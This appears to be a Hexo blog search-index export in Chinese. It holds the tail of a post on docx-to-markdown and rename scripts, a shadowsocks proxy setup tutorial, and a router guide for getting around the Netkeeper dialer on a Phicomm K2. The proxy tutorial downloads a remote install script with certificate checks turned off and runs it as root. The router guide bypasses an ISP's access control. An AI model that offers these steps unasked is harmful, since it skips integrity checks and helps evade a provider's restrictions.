var&#x3D;%%i</span><br><span class="line">    set var&#x3D;!var:%adv%&#x3D;!</span><br><span class="line">    echo rename &quot;%%i&quot; to &quot;!var!&quot;</span><br><span class="line">    ren &quot;%%i&quot; &quot;!var!&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">echo.</span><br><span class="line">goto:eof</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>  批量将当前目录中的docx文档转换为markdown格式：<br><img src="/images/pasted-11.png" alt="upload successful"></li></ul>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line"># 当前目录下所有文件的名字</span><br><span class="line">all_files_name &#x3D; os.listdir()</span><br><span class="line"></span><br><span class="line"># 保存所有docx文件的名字</span><br><span class="line">all_docx_files &#x3D; []</span><br><span class="line"></span><br><span class="line"># 获取目录下的docx文件, 并保存</span><br><span class="line">for file_name in all_files_name:</span><br><span class="line">    try:</span><br><span class="line">        if file_name[-5:] &#x3D;&#x3D; &quot;.docx&quot;:</span><br><span class="line">            all_docx_files.append(file_name)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line"># 将docx文件批量装换为md</span><br><span class="line">for docx_file in all_docx_files:</span><br><span class="line">    try:</span><br><span class="line">        tmp_md_name &#x3D; docx_file[0: -5] + &quot;.md&quot;</span><br><span class="line">        new_command &#x3D; &quot;pandoc &quot;+ docx_file + &quot; -o &quot; + tmp_md_name + &quot; --extract-media&#x3D;&quot; + docx_file[0: -5]</span><br><span class="line">        result &#x3D; os.popen(new_command).readlines()</span><br><span class="line">        if len(result) &#x3D;&#x3D; 0:</span><br><span class="line">            print(docx_file, &quot;转换成功&quot;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br></pre></td></tr></table></figure></li><li><p>批量生成docsify目录md文档</p><ul><li>插件地址：<a href="https://github.com/julianxhokaxhiu/gitbook-plugin-summary">https://github.com/julianxhokaxhiu/gitbook-plugin-summary</a></li><li>  安装：npm i gitbook-plugin-summary</li><li>  即可使用命令：book sm生成SUMMARY.md</li><li>  可将SUMMARY.md的内容复制到docsify目录下的_navbar.md文件中，即可批量生成目录。（注意：路径中不要有空格和[]&amp;等特殊字符）</li></ul></li></ul><h2 id="0x06-FAQ"><a href="#0x06-FAQ" class="headerlink" title="0x06 FAQ"></a>0x06 FAQ</h2><ul><li>docsify中有许多好用的小插件，可以选择性的加载。<br><img src="/images/pasted-12.png" alt="upload successful"></li></ul>]]></content>
      
      
      <categories>
          
          <category> Wiki </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 知识库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阿里云香港服务器搭建ssr科学上网</title>
      <link href="2019/04/14/%E9%98%BF%E9%87%8C%E4%BA%91%E9%A6%99%E6%B8%AF%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BAssr%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"/>
      <url>2019/04/14/%E9%98%BF%E9%87%8C%E4%BA%91%E9%A6%99%E6%B8%AF%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BAssr%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/</url>
      
        <content type="html"><![CDATA[<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">环境：阿里云香港ECS</span><br><span class="line">配置：cpu 1核心、内存 0.5GB、出网带宽 1Mbps</span><br><span class="line">系统：centos7.5</span><br></pre></td></tr></table></figure><h2 id="shadowsocks简介"><a href="#shadowsocks简介" class="headerlink" title="shadowsocks简介"></a>shadowsocks简介</h2><p><strong>shadowsocks</strong>是一种基于Socks5代理方式的网络数据加密传输包，并采用Apache许可证、GPL、MIT许可证等多种自由软件许可协议开放源代码。shadowsocks分为服务器端和客户端，在使用之前，需要先将服务器端部署到服务器上面，然后通过客户端连接并创建本地代理。目前包使用Python、C、C++、C#、Go语言等编程语言开发。</p><p>运行原理：Shadowsocks的运行原理与其他代理工具基本相同，使用特定的中转服务器完成数据传输。在服务器端部署完成后，用户需要按照指定的密码、加密方式和端口使用客户端软件与其连接。在成功连接到服务器后，客户端会在用户的电脑上构建一个本地Socks5代理。浏览网络时，网络流量会被分到本地socks5代理，客户端将其加密之后发送到服务器，服务器以同样的加密方式将流量回传给客户端，以此实现代理上网。</p><h2 id="开始搭建"><a href="#开始搭建" class="headerlink" title="开始搭建"></a>开始搭建</h2><p><strong>1、使用root用户，分别执行以下3条命令</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --no-check-certificate -O shadowsocks-all.sh https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;teddysun&#x2F;shadowsocks_install&#x2F;master&#x2F;shadowsocks-all.sh</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x shadowsocks-all.sh　</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;shadowsocks-all.sh 2&gt;&amp;1 &#39; tee shadowsocks-all.log</span><br></pre></td></tr></table></figure><p>执行后，会提示输入源码语言，密码、端口、及加密方式等。（笔者这里端口使用8989；源码选择的是python语言；加密方式我这里选择aes-256-cfb；）</p><p>最终会显示以下效果，说明部署已完成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Congratulations, your_shadowsocks_version install completed!  </span><br><span class="line"></span><br><span class="line">Your Server IP        :11.11.11.11  </span><br><span class="line"></span><br><span class="line">Your Server Port      :8989  </span><br><span class="line"></span><br><span class="line">Your Password         :123456  </span><br><span class="line"></span><br><span class="line">Your Encryption Method:aes-256-cfb</span><br><span class="line"></span><br><span class="line">Welcome to visit:https:&#x2F;&#x2F;teddysun.com&#x2F;486.html  </span><br><span class="line"> Enjoy it</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2、<strong>把8989端口设置为开放状态</strong></p><p>打开防火墙配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vim &#x2F;etc&#x2F;sysconfig&#x2F;iptables</span><br></pre></td></tr></table></figure><p>插入下面这句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-A INPUT -p tcp -m state --state NEW -m tcp --dport 8989 -j ACCEPT</span><br></pre></td></tr></table></figure><p>保存后使更改生效，执行以下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ service iptables save  </span><br></pre></td></tr></table></figure><p>3、<strong>开放云服务器端口（如果是阿里云服务器请继续看）</strong></p><p>阿里云有安全组配置，需要进入阿里云管理界面找到安全组配置，把8989端口开放。否则外网依然无法方位该端口。</p><p>至此，服务器部署完成！</p><p>3、<strong>卸载方法：使用root用户，执行以下命令即可</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;shadowsocks-all.sh uninstall</span><br></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="windows客户端"><a href="#windows客户端" class="headerlink" title="windows客户端"></a><strong>windows客户端</strong></h3><p>首先搜索shadowsocks-windows，打开后进行如下配置。</p><p>服务器地址：云服务器ip、端口：之前配置的端口、加密方式要选择服务器选择的加密方式、本级代理端口1080（可以改成别的）。<br><img src="/images/pasted-2.png" alt="upload successful"></p><p>配置好后，在电脑右下角找到ss，并点击启用。</p><p><img src="/images/pasted-3.png" alt="upload successful"></p><h3 id="iphone代理配置"><a href="#iphone代理配置" class="headerlink" title="iphone代理配置"></a>iphone代理配置</h3><p><strong>a.下载：</strong></p><p>APP Store中下载<strong>shadowrocket（</strong>需美国id付费<strong>）。</strong></p><p><strong>b.使用：</strong></p><p>打开App后， 点击右上角 + 号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">type：ss  </span><br><span class="line"></span><br><span class="line">name : 随便起一个名字即可。笔者是：abcd  </span><br><span class="line"></span><br><span class="line">server : 云服务器ip  </span><br><span class="line"></span><br><span class="line">port : 刚才配置的ip。笔者是：8989  </span><br><span class="line"></span><br><span class="line">password ： 你服务器设置的密码  </span><br><span class="line"></span><br><span class="line">proxyMethod：system  </span><br><span class="line"></span><br><span class="line">method ： 刚才配置的加密方式。笔者是：AES-256-CFB</span><br></pre></td></tr></table></figure><p>点击”save configuration”后进入choos页面，点击你刚刚创建的那个名字abcd即可。回到首页，找到你创建的代理并打开。</p><p>配置成功！经测试google、YouTube等网站打开很快，1080p视频毫无压力。</p><h3 id="ubuntu系统代理配置"><a href="#ubuntu系统代理配置" class="headerlink" title="ubuntu系统代理配置"></a>ubuntu系统代理配置</h3><p><strong>a.安装shadowsocks</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install shadowsocks</span><br></pre></td></tr></table></figure><p><strong>b.找到config.json，并编辑代理配置</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd &#x2F;etc&#x2F;shadowsocks&#x2F;</span><br><span class="line">$ sudo vim config.json</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;server&quot;:&quot;x.x.x.x&quot;,    &#x2F;&#x2F;ss服务器的ip</span><br><span class="line">    &quot;server_port&quot;:8989, &#x2F;&#x2F;ss服务器的端口，笔者这里配置的是8989</span><br><span class="line">     &quot;local_address&quot;: &quot;127.0.0.1&quot;,</span><br><span class="line">    &quot;local_port&quot;:1080,  &#x2F;&#x2F;本机端口：可以换成别的</span><br><span class="line">    &quot;password&quot;:&quot;123456&quot;, &#x2F;&#x2F;ss服务器密码</span><br><span class="line">    &quot;timeout&quot;:300,</span><br><span class="line">    &quot;method&quot;:&quot;aes-256-cfb&quot; &#x2F;&#x2F;ss服务器配置的加密方式</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>c.启动shadowsocks，启动后控制台不要关闭</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sslocal -c config.json</span><br></pre></td></tr></table></figure><p><strong>d.配置代理。</strong></p><p>右上角-系统设置-网络-网络代理-手动。</p><p>Socks主机：127.0.0.1 &nbsp; &nbsp;端口：1080</p><p>最后点击”应用到整个系统”，至此，配置完成。</p><p><strong>e.让终端也走代理的方法:</strong></p><p>在~/.bashrc文件中增加以下两句，表示bash终端中的http和https的请求也通过socks5协议进行代理转发。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export http_proxy&#x3D;&quot;socks5:&#x2F;&#x2F;127.0.0.1:1080&quot;</span><br><span class="line">export https_proxy&#x3D;&quot;socks5:&#x2F;&#x2F;127.0.0.1:1080&quot;&lt;&#x2F;pre&gt;</span><br></pre></td></tr></table></figure><p>注：本次教程借鉴于<a href="https://www.cnblogs.com/tianhei/p/7428622.html">https://www.cnblogs.com/tianhei/p/7428622.html</a>　，本教程只用于学习使用，切勿用于商业和非法用途，此站点不承担任何法律责任。</p>]]></content>
      
      
      <categories>
          
          <category> 科学上网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssr科学上网 </tag>
            
            <tag> shadowsocks </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路由破解-netkeeper拨号</title>
      <link href="2018/09/01/%E6%97%A0%E7%BA%BF%E7%A0%B4%E8%A7%A3-netkeeper%E6%8B%A8%E5%8F%B7/"/>
      <url>2018/09/01/%E6%97%A0%E7%BA%BF%E7%A0%B4%E8%A7%A3-netkeeper%E6%8B%A8%E5%8F%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="斐讯k2拨号开无线"><a href="#斐讯k2拨号开无线" class="headerlink" title="斐讯k2拨号开无线"></a>斐讯k2拨号开无线</h1><ul><li><p>1、刷breed 详细教程见文件<a href="https://github.com/kb-at-zero/netkeeper-breed/releases/download/1.0/K2.breed.doc">斐讯K2刷breed教程</a>。</p></li><li><p>2、k2拔掉电源后长按复位键不松手并插上电源线等待连续多个白灯同时迅速闪烁几次后再松手。</p></li><li><p>3、必须用网线连接电脑和路由器，浏览器输入192.168.1.1，进入breed界面。</p></li><li><p>4、依次点击：固件更新，勾选固件选项好自动重启，点击选择文件，选择固件，点击开始刷新并确认。</p></li><li><p>5、等待刷机完成后路由自动重启。</p></li><li><p>6、重启完成后浏览器输入192.168.1.1进入固件设置界面，登录默认用户名root，密码admin，登录以后将浏览器最小化等待后续使用。</p></li><li><p>7、打开winscp.exe，File protocol选择SCP，Host name输入192.168.1.1，User name输入root，Password输入admin，点击Login登录，出现Warning提示窗口点击Update即可进入。</p></li><li><p>8、此时界面左边文件栏是本地的，右边是路由器的，左边定位到教程和相关文件所在文件夹，右边多次点击..返回根目录，依次点击路径usr-lib-pppd-2.4.7，将左边栏目里shandongmobile_sxplugin.so拖动到右边并右击选择Properties（属性），出来的界面中将输入框里面默认的0644改成0755并确定保存。</p></li><li><p>9、右边多次点击..返回路由器根目录，双击打开tmp文件夹，左边右击confnetwork.sh选择Edit，在出来的界面将账号，密码填写完并保存，然后将此文件拖动到右边tmp文件夹内。</p></li><li><p>10、打开指令.txt，找到winscp界面靠近左上角一个黑色命令行按钮，点击打开，将指令.txt里面的上下两个指令（chmod a+x /tmp/confnetwork.sh&nbsp;&nbsp;&nbsp;&nbsp; sh /tmp/confnetwork.sh）依次复制粘贴到输入框里面并点击Execute，每输入一个指令都点击一下Execute，两个指令顺序千万不能反，第二指令如果弹窗出现任何信息都重新点击Execute操作，第二指令正常操作应该是光标变成沙漏样式好几秒以后恢复正常。</p></li><li><p>11、打开步骤6的浏览器，点击左边栏目系统-重启，点击执行重启，路由器重启完成会重新出现设置界面登录的信息，登录以后点击系统-系统，点击两次蓝色方框的同步浏览器时间按钮，每次都是等待时间变化后再点击一次等待显示时间和电脑时间相同时再立即插上网线，此时就可以正常上网了。</p></li><li><p>12、每次给路由器断电后必须拔掉网线，然后再通电开机，手机或电脑连接路由后登录设置界面并点击系统-系统，点击同步浏览器时间，然后立即插上网线开始上网。</p></li></ul><h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a><strong>注意</strong></h1><p><strong>1、网线直到教程结束前都不要插上路由器，否则完全无法成功且必须重新操作一遍教程步骤。</strong></p><p><strong>2、一旦路由出现任何问题无法上网时必须将教程除了刷breed以外再次完整操作一遍，否则无法上网</strong>。</p><p><strong>3、breed中备份固件功能请勿使用，备份出来的netkeeper网配置好的固件刷进去依旧会造成无法拨号上网的情况并需要重新将教程操作一遍</strong>。</p><p><strong>4、如果步骤7提示被拒绝，就浏览器输入192.168.1.1登录设置界面，点击系统-管理权，设置新密码然后再回到winscp改成对应密码再登录。</strong></p><p><strong>5、步骤11点击两次同步时间是点一次就连网线有小几率会出现后续配置完全失败得重新操作的情况。</strong></p><p><strong>特别注意：本文章只供学习用途。</strong></p><p>附上全部教程与文件（<a href="https://github.com/kb-at-zero/netkeeper-breed/releases/download/1.0/default1.zip">第一部分</a>&nbsp; <a href="https://github.com/kb-at-zero/netkeeper-breed/releases/download/1.0/default2.zip">第二部分</a>）</p>]]></content>
      
      
      <categories>
          
          <category> 路由器 </category>
          
          <category> 无线WIFI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> netkeeper </tag>
            
            <tag> 无线破解 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
